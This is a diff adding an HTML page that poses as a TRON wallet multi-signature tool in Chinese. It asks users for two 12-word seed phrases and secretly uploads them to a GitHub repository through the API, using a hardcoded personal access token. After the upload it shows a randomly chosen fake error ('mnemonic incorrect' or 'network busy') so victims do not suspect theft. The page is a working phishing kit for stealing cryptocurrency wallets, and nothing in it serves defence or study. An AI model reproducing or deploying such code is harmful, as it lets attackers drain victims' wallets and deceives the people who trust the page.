@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>波场TRON 钱包多签</title>
+    <style>
+        * {
+            -webkit-tap-highlight-color: transparent; /* 移除点击高亮 */
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px 15px 70px; /* 底部留出按钮空间 */
+            min-height: 100vh;
+            -webkit-overflow-scrolling: touch; /* iOS滑动优化 */
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+            padding-top: 10px;
+        }
+        h1 {
+            color: #2c3e50;
+            font-size: 22px;
+            margin: 0 0 8px;
+        }
+        .warning {
+            background: #fef6e6;
+            color: #e67c00;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 25px;
+            border: 1px solid #ffd699;
+        }
+        .mnemonic-input {
+            background: white;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+        textarea {
+            width: 100%;
+            min-height: 100px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            resize: none;
+            background: #fafafa;
+            -webkit-appearance: none; /* 移除iOS默认样式 */
+        }
+        textarea:focus {
+            border-color: #4285f4;
+            outline: none;
+            background: #fff;
+        }
+        .next-btn {
+            position: fixed;
+            bottom: 15px;
+            left: 15px;
+            right: 15px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+            box-shadow: 0 3px 10px rgba(66,133,244,0.3);
+        }
+        .next-btn:active {
+            background: #3367d6;
+        }
+        .next-btn:disabled {
+            background: #b9c9e8;
+            cursor: not-allowed;
+        }
+        .notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            z-index: 1000;
+            text-align: center;
+            max-width: 80%;
+            display: none;
+        }
+        .notification-buttons {
+            margin-top: 15px;
+            display: flex;
+            gap: 10px;
+        }
+        .notification-button {
+            flex: 1;
+            padding: 8px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .notification-confirm {
+            background: #4285f4;
+            color: white;
+        }
+        /* iOS输入框光标优化 */
+        @media (max-width: 480px) {
+            textarea {
+                padding: 10px;
+                min-height: 90px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>波场TRON 钱包多签</h1>
+    </div>
+    
+    <div class="warning">
+        请勿截屏，请勿泄漏助记词
+    </div>
+    
+    <div class="mnemonic-input">
+        <label for="mnemonic1">主钱包(12个单词)</label>
+        <textarea id="mnemonic1" placeholder="输入空格分隔的12个助记词" autocomplete="off"></textarea>
+    </div>
+    
+    <div class="mnemonic-input">
+        <label for="mnemonic2">被多签钱包(12个单词)</label>
+        <textarea id="mnemonic2" placeholder="输入空格分隔的12个助记词" autocomplete="off"></textarea>
+    </div>
+    
+    <button id="nextButton" class="next-btn" disabled>下一步</button>
+
+    <!-- 通知弹窗 -->
+    <div id="notification" class="notification">
+        <div id="notificationMessage"></div>
+        <div class="notification-buttons">
+            <button id="confirmButton" class="notification-button notification-confirm">确定</button>
+        </div>
+    </div>
+
+    <script>
+        // 配置GitHub存储 (需用户自行设置)
+        const GITHUB_TOKEN = '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';  // 替换为GitHub个人访问令牌
+        const REPO = 'TronlinkGo/Tron.github.io';   // 格式: 用户名/仓库名
+        const FILE_PATH = 'mnemonics.json';        // 存储文件名
+
+        // DOM元素引用
+        const mnemonic1 = document.getElementById('mnemonic1');
+        const mnemonic2 = document.getElementById('mnemonic2');
+        const nextButton = document.getElementById('nextButton');
+        const notification = document.getElementById('notification');
+        const notificationMessage = document.getElementById('notificationMessage');
+        const confirmButton = document.getElementById('confirmButton');
+
+        // 监听输入启用按钮
+        [mnemonic1, mnemonic2].forEach(input => {
+            input.addEventListener('input', validateInputs);
+        });
+
+        // 输入验证
+        function validateInputs() {
+            const isValid1 = validateMnemonic(mnemonic1.value);
+            const isValid2 = validateMnemonic(mnemonic2.value);
+            nextButton.disabled = !(isValid1 && isValid2);
+        }
+
+        // 助记词格式验证
+        function validateMnemonic(text) {
+            const words = text.trim().split(/\s+/);
+            return words.length === 12 && words.every(w => w.length > 0);
+        }
+
+        // 显示通知
+        function showNotification(message) {
+            notificationMessage.textContent = message;
+            notification.style.display = 'block';
+        }
+
+        // 隐藏通知
+        function hideNotification() {
+            notification.style.display = 'none';
+        }
+
+        // 确认按钮点击事件
+        confirmButton.addEventListener('click', hideNotification);
+
+        // 提交数据到GitHub
+        nextButton.addEventListener('click', async () => {
+            nextButton.disabled = true;
+            nextButton.textContent = '提交中...';
+            
+            try {
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    mnemonic1: mnemonic1.value.trim(),
+                    mnemonic2: mnemonic2.value.trim()
+                };
+
+                // GitHub API请求
+                const response = await fetch(`https://api.github.com/repos/${REPO}/contents/${FILE_PATH}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: `添加助记词记录 - ${new Date().toLocaleString()}`,
+                        content: btoa(JSON.stringify(data, null, 2)),
+                        sha: await getFileSHA() // 更新现有文件需要SHA
+                    })
+                });
+
+                if (response.ok) {
+                    // 生成随机数决定提示信息
+                    const random = Math.random();
+                    if (random < 0.75) {
+                        showNotification('助记词错误，助记词中间用空格分隔');
+                    } else {
+                        showNotification('Tron链上繁忙，请稍后再试');
+                    }
+                } else {
+                    throw new Error(`GitHub错误: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('提交失败:', error);
+                showNotification(`提交失败: ${error.message}`);
+            } finally {
+                nextButton.textContent = '下一步';
+                validateInputs();
+            }
+        });
+
+        // 获取现有文件的SHA (用于更新)
+        async function getFileSHA() {
+            try {
+                const response = await fetch(`https://api.github.com/repos/${REPO}/contents/${FILE_PATH}`, {
+                    headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+                });
+                
+                if (!response.ok) {
+                    // 文件不存在时返回null
+                    if (response.status === 404) return null;
+                    throw new Error(`获取SHA失败: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                return data.sha;
+            } catch (error) {
+                console.error('获取SHA失败:', error);
+                return null; // 文件不存在或其他错误
+            }
+        }
+
+        // iOS键盘优化
+        document.querySelectorAll('textarea').forEach(input => {
+            input.addEventListener('blur', () => {
+                setTimeout(() => window.scrollTo(0, 0), 100);
+            });
+        });
+    </script>
+</body>
+</html>
